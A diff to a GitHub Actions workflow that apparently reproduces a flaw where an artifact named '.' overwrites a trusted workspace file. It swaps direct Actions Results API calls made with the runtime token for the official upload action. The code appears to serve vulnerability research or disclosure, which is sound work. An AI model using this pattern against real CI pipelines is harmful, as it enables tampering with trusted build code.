@@ -15,7 +15,7 @@ jobs:
   produce:
     runs-on: ubuntu-latest
     steps:
-      - name: Build benign archives
+      - name: Build benign inputs
         shell: bash
         run: |
           set -euo pipefail
@@ -36,83 +36,15 @@ jobs:
           console.log('PASS: dot-named artifact overwrote the trusted workspace target; token_present=true');
           PAYLOAD
           printf '%s\n' 'benign second artifact' > "$RUNNER_TEMP/benign/witness.txt"
-          (cd "$RUNNER_TEMP/dot" && zip -q "$RUNNER_TEMP/dot.zip" trusted-target.js)
-          (cd "$RUNNER_TEMP/benign" && zip -q "$RUNNER_TEMP/benign.zip" witness.txt)
 
-      - name: Upload a literal dot artifact through Actions Results
-        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
+      - name: Upload literal dot artifact with the official action
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
         with:
-          github-token: ${{ github.token }}
-          script: |
-            const crypto = require('crypto');
-            const fs = require('fs');
-            const path = require('path');
+          name: .
+          path: ${{ runner.temp }}/dot/trusted-target.js
 
-            const token = process.env.ACTIONS_RUNTIME_TOKEN;
-            const resultsURL = process.env.ACTIONS_RESULTS_URL;
-            if (!token || !resultsURL) throw new Error('missing Actions artifact runtime input');
-
-            const payloadPart = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
-            const payload = JSON.parse(Buffer.from(payloadPart, 'base64').toString('utf8'));
-            const resultScope = String(payload.scp || '')
-              .split(' ')
-              .find(scope => scope.startsWith('Actions.Results:'));
-            if (!resultScope) throw new Error('Actions.Results scope missing');
-            const [, workflowRunBackendId, workflowJobRunBackendId] = resultScope.split(':');
-            const origin = new URL(resultsURL).origin;
-
-            async function rpc(method, body) {
-              const response = await fetch(
-                `${origin}/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
-                {
-                  method: 'POST',
-                  headers: {
-                    Authorization: `Bearer ${token}`,
-                    'Content-Type': 'application/json',
-                  },
-                  body: JSON.stringify(body),
-                },
-              );
-              if (!response.ok) throw new Error(`${method} failed with HTTP ${response.status}`);
-              return response.json();
-            }
-
-            async function upload(name, archivePath) {
-              const create = await rpc('CreateArtifact', {
-                workflow_run_backend_id: workflowRunBackendId,
-                workflow_job_run_backend_id: workflowJobRunBackendId,
-                name,
-                version: 7,
-                mime_type: 'application/zip',
-              });
-              if (!create.ok || !create.signed_upload_url) {
-                throw new Error(`CreateArtifact returned no upload URL for ${JSON.stringify(name)}`);
-              }
-
-              const bytes = fs.readFileSync(archivePath);
-              const response = await fetch(create.signed_upload_url, {
-                method: 'PUT',
-                headers: {
-                  'Content-Type': 'application/zip',
-                  'Content-Length': String(bytes.length),
-                  'x-ms-blob-type': 'BlockBlob',
-                },
-                body: bytes,
-              });
-              if (!response.ok) throw new Error(`blob upload failed with HTTP ${response.status}`);
-
-              const hash = crypto.createHash('sha256').update(bytes).digest('hex');
-              const finalize = await rpc('FinalizeArtifact', {
-                workflow_run_backend_id: workflowRunBackendId,
-                workflow_job_run_backend_id: workflowJobRunBackendId,
-                name,
-                size: String(bytes.length),
-                hash: `sha256:${hash}`,
-              });
-              if (!finalize.ok) throw new Error(`FinalizeArtifact failed for ${JSON.stringify(name)}`);
-              return finalize.artifact_id;
-            }
-
-            const dotId = await upload('.', path.join(process.env.RUNNER_TEMP, 'dot.zip'));
-            const benignId = await upload('benign', path.join(process.env.RUNNER_TEMP, 'benign.zip'));
-            console.log(`PASS: production accepted dot artifact; two_artifacts=true; ids_present=${Boolean(dotId && benignId)}`);
+      - name: Upload second artifact with the official action
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
+        with:
+          name: benign
+          path: ${{ runner.temp }}/benign/witness.txt
